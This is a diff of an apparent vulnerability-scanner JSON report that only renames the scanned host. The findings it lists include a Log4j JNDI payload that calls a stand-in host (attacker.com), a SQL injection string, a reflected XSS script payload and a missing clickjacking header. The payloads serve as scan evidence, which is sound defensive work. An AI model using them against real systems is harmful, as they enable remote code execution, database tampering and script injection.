@@ -4,8 +4,8 @@
   "@generated": "Sat, 17 Feb 2026 00:05:00",
   "site": [
     {
-      "@name": "https://api.sentinelai.internal:8080",
-      "@host": "api.sentinelai.internal",
+      "@name": "https://api.vertexai.internal:8080",
+      "@host": "api.vertexai.internal",
       "@port": "8080",
       "@ssl": "true",
       "alerts": [
@@ -20,14 +20,14 @@
           "desc": "Apache Log4j2 versions 2.0-beta9 to 2.14.1 allow remote code execution via JNDI lookups in logged user headers.",
           "instances": [
             {
-              "uri": "https://api.sentinelai.internal:8080/api/v1/auth/login",
+              "uri": "https://api.vertexai.internal:8080/api/v1/auth/login",
               "method": "POST",
               "param": "X-Api-Version",
               "attack": "${jndi:ldap://attacker.com/a}",
               "evidence": "Received DNS callback from 192.168.1.100"
             },
             {
-              "uri": "https://api.sentinelai.internal:8080/api/v1/search",
+              "uri": "https://api.vertexai.internal:8080/api/v1/search",
               "method": "GET",
               "param": "q",
               "attack": "${jndi:ldap://attacker.com/search}",
@@ -53,7 +53,7 @@
           "desc": "SQL injection vulnerability allows attackers to read or modify arbitrary database records.",
           "instances": [
             {
-              "uri": "https://api.sentinelai.internal:8080/api/v1/reports/query",
+              "uri": "https://api.vertexai.internal:8080/api/v1/reports/query",
               "method": "POST",
               "param": "filter_id",
               "attack": "1' OR '1'='1",
@@ -79,7 +79,7 @@
           "desc": "The response does not include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options to protect against Clickjacking.",
           "instances": [
             {
-              "uri": "https://api.sentinelai.internal:8080/index.html",
+              "uri": "https://api.vertexai.internal:8080/index.html",
               "method": "GET",
               "param": "",
               "attack": "",
@@ -104,7 +104,7 @@
           "desc": "Reflected Cross-Site Scripting (XSS) occurs when an application includes unvalidated and unescaped user input in its output.",
           "instances": [
             {
-              "uri": "https://api.sentinelai.internal:8080/api/v1/error?msg=%3Cscript%3Ealert(1)%3C/script%3E",
+              "uri": "https://api.vertexai.internal:8080/api/v1/error?msg=%3Cscript%3Ealert(1)%3C/script%3E",
               "method": "GET",
               "param": "msg",
               "attack": "<script>alert(1)</script>",
